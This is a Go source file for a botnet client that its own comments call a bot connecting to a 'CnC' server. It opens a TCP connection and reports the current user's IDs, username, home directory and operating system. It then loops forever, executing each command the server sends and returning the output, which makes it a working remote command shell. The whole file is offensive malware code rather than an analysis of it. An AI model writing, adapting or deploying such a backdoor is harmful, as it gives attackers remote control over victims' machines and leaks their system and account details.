package main;

import (
  "fmt";
  "net";
  "bufio";
  "strings";
  "os/exec";
  "log";
  "os/user";
  "runtime";
  "io";
)

//main() function handles everything
func main() {

    // Conection to the CnC serever
    conn, err := net.Dial("tcp","localhost:8080");
    if err != nil {
      log.Fatalln("Error establihng a connection ",err);
    }
    defer func(){
      conn.Close();
      }()
      fmt.Println("Connection established");

    // Initially get the information about the system
    os_version := runtime.GOOS;
    os_user, err := user.Current();
    //cpu_num := runtime.NumCPU();
    user_data := "User ID: " + os_user.Uid +" User GID: "+ os_user.Gid + " Login Name: " + os_user.Username + "User Display Name: "+ os_user.Name +"User Home Dir: "+ os_user.HomeDir +"OS os_version: "+os_version+"\n";
    _, err = io.WriteString(conn,user_data);
    if err != nil {
      fmt.Println("Error sending message ",err);
      return;
    }

    // Now the Loop starts where the bot will try to continously try to get command from server
    for {// Starts loop
        msg, err := bufio.NewReader(conn).ReadString('\n');
        msg = strings.Trim(msg,"\n");  // Getting rid of \n
        msg2 := strings.Split(msg," ");  // Spliting the message to handle space
        if err != nil {
          fmt.Println("Error Readin from server dumbass",err)
          return;
        }

        // Executing the command and getting output
        output, err := exec.Command(msg2[0],msg2[1:]...).Output();
        if err != nil {
          fmt.Println("Something Went wrong while Execuing the command ",err);
          return;
        }

        // Send the output of command to server;
        io.WriteString(conn,string(output));
    } // ENds loop

}
